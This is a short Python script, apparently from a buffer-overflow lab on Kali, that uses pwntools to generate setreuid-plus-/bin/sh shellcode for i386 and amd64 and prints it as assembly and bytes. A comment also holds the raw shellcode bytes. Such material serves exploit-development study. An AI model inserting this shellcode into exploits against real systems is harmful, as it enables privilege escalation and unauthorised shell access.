#!/usr/bin/env python3
# #2025-01-24

#┌──(kali㉿kali)-[~/bof]
#└─$ pwn shellcraft --format d i386.linux.setreuid 1001 + i386.linux.sh 
#\x31\xdb\x66\xbb\xe9\x03\x6a\x46\x58\x89\xd9\xcd\x80\x6a\x68\x68\x2f\x2f\x2f\x73\x68\x2f\x62\x69\x6e\x89\xe3\x68\x01\x01\x01\x01\x81\x34\x24\x72\x69\x01\x01\x31\xc9\x51\x6a\x04\x59\x01\xe1\x51\x89\xe1\x31\xd2\x6a\x0b\x58\xcd\x80

from pwn import *

shell_i386 = shellcraft.i386.linux.setreuid()+shellcraft.i386.linux.sh()
shell_amd64 = shellcraft.amd64.linux.setreuid()+shellcraft.amd64.linux.sh()

print(shell_i386) # outputs assembler code
context.arch = "i386"
context.bits = 32
print(asm(shell_i386)) # generates machine code in bytes format
print()
print(repr(asm(shell_i386))) # generates machine code in bytes format

input("\n<Press any key to continue!>\n")

print(shell_amd64) # outputs assembler code
context.arch = "amd64"
context.bits = 64
print(asm(shell_amd64)) # generates machine code in bytes format
